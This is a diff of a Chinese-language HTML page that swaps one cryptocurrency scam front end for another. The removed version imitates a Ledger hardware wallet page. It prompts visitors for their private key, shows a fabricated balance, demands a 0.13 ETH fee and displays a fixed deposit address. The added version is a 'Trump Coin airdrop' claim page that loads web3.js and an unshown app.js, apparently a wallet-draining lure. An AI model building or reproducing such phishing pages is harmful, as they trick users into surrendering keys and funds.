@@ -2,147 +2,57 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Ledger 硬件钱包</title>
-    <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@400;500;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>立刻领取空投 - Trump Coin</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <!-- 主页 -->
-    <div class="content" id="home-page">
-        <div class="ledger-icon"></div>
-        <h1 class="title">Ledger 硬件钱包</h1>
-        <div class="countdown">下次安全更新倒计时：<span id="countdown-minutes"></span> 分 <span id="countdown-seconds"></span> 秒</div>
-        <div class="button-container">
-            <button class="secondary-button" onclick="showModal('private-key-modal')">使用私钥找回钱包资产</button>
-            <button class="fifth-button" onclick="showModal('private-key-modal')">找回Ledger资产</button>
-            <button class="quaternary-button" onclick="showModal('private-key-modal')">在线找回Ledger资产并转移</button>
+    <!-- 粒子背景容器 -->
+    <div id="particles-js"></div>
+
+    <!-- 页面内容 -->
+    <div class="container">
+        <!-- 顶部特朗普标题 -->
+        <div class="trump-header">
+            <h1>TRUMP COIN AIRDROP</h1>
         </div>
-        <div class="security-note">已保护：<span>99.9%</span> 资产安全</div>
+        
+        <!-- 特朗普币元素 -->
+        <div class="trump-coin">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/56/Donald_Trump_official_portrait.jpg/220px-Donald_Trump_official_portrait.jpg" 
+                 alt="Trump" 
+                 class="trump-face">
+        </div>
+        
+        <!-- 领取按钮 -->
+        <button id="claimButton" class="trump-button">立刻领取</button>
     </div>
 
-    <!-- 私钥输入页面 -->
-    <div class="modal" id="private-key-modal">
-        <div class="modal-content">
-            <div class="ledger-icon"></div>
-            <p>请输入 Ledger 硬件钱包的私钥</p>
-            <input type="text" id="private-key-input" placeholder="输入私钥">
-            <div class="balance-buttons">
-                <button onclick="verifyPrivateKey()">下一步</button>
-                <button onclick="closeModal('private-key-modal')">关闭</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- 私钥验证结果页面 -->
-    <div class="modal" id="key-result-modal">
-        <div class="modal-content">
-            <div class="ledger-icon"></div>
-            <p id="key-result-text"></p>
-            <div class="balance-buttons">
-                <button id="next-button" onclick="nextStep()" style="display: none;">下一步</button>
-                <button onclick="closeModal('key-result-modal')">关闭</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- 余额页面 -->
-    <div class="modal" id="balance-modal">
-        <div class="modal-content">
-            <div class="ledger-icon"></div>
-            <div class="network-info">网络: <span>Ethereum Mainnet</span></div>
-            <div class="balance-card">
-                <p>
-                    <span class="coin-icon-container">
-                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" alt="USDT Icon" class="coin-icon">
-                    </span>
-                    USDT 余额: <span id="usdt-balance"></span>
-                </p>
-                <p>
-                    <span class="coin-icon-container">
-                        <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png" alt="ETH Icon" class="coin-icon">
-                    </span>
-                    ETH 余额: 0 ETH
-                </p>
-            </div>
-            <div class="balance-buttons">
-                <button onclick="showModal('transfer-modal')">转账</button>
-                <button onclick="showModal('receive-modal')">收款</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- 转账页面 -->
-    <div class="modal" id="transfer-modal">
-        <div class="modal-content">
-            <div class="ledger-icon"></div>
-            <p>输入转账数据</p>
-            <input type="text" id="transfer-address" placeholder="输入转账地址">
-            <input type="number" id="transfer-amount" placeholder="输入转账数量">
-            <div class="balance-buttons">
-                <button onclick="transferNext()">下一步</button>
-                <button onclick="closeModal('transfer-modal')">关闭</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- 转账手续费提示 -->
-    <div class="modal" id="fee-modal">
-        <div class="modal-content">
-            <div class="ledger-icon"></div>
-            <p>转账手续费不足，请补充最低 0.13 ETH</p>
-            <div class="balance-buttons">
-                <button onclick="closeModal('fee-modal')">关闭</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- USDT 余额不足提示 -->
-    <div class="modal" id="balance-insufficient-modal">
-        <div class="modal-content">
-            <div class="ledger-icon"></div>
-            <p>USDT 余额不足</p>
-            <div class="balance-buttons">
-                <button onclick="closeModal('balance-insufficient-modal')">关闭</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- 地址错误提示 -->
-    <div class="modal" id="address-error-modal">
-        <div class="modal-content">
-            <div class="ledger-icon"></div>
-            <p>地址错误</p>
-            <div class="balance-buttons">
-                <button onclick="closeModal('address-error-modal')">关闭</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- 收款页面 -->
-    <div class="modal" id="receive-modal">
-        <div class="modal-content">
-            <div class="ledger-icon"></div>
-            <p>收款地址</p>
-            <div class="receive-address">0x64C6592164CC7C0Bdfb1D9a6F64C172a1830eD2C</div>
-            <div class="balance-buttons">
-                <button onclick="copyAddress()">复制地址</button>
-                <button onclick="closeModal('receive-modal')">关闭</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- 复制成功提示 -->
-    <div class="copy-toast" id="copy-toast">复制成功</div>
-
-    <!-- 粒子背景 -->
-    <div id="particles"></div>
-    <div class="hex-grid"></div>
-    <div class="circuit-flow-left"></div>
-    <div class="circuit-flow-right"></div>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
+    <!-- 引入 particles.js 库用于动态背景 -->
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <!-- 引入 web3.js 库 -->
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+    <!-- 引入 app.js -->
     <script src="app.js"></script>
+    <!-- 初始化粒子背景 -->
+    <script>
+        particlesJS("particles-js", {
+            particles: {
+                number: { value: 80, density: { enable: true, value_area: 800 } },
+                color: { value: "#d4af37" },
+                shape: { type: "star", stroke: { width: 0, color: "#000000" } },
+                opacity: { value: 0.5, random: true },
+                size: { value: 3, random: true },
+                line_linked: { enable: false },
+                move: { enable: true, speed: 2, direction: "none", random: true, out_mode: "out" }
+            },
+            interactivity: {
+                detect_on: "canvas",
+                events: { onhover: { enable: true, mode: "repulse" }, onclick: { enable: true, mode: "push" } },
+                modes: { repulse: { distance: 100, duration: 0.4 }, push: { particles_nb: 4 } }
+            },
+            retina_detect: true
+        });
+    </script>
 </body>
 </html>
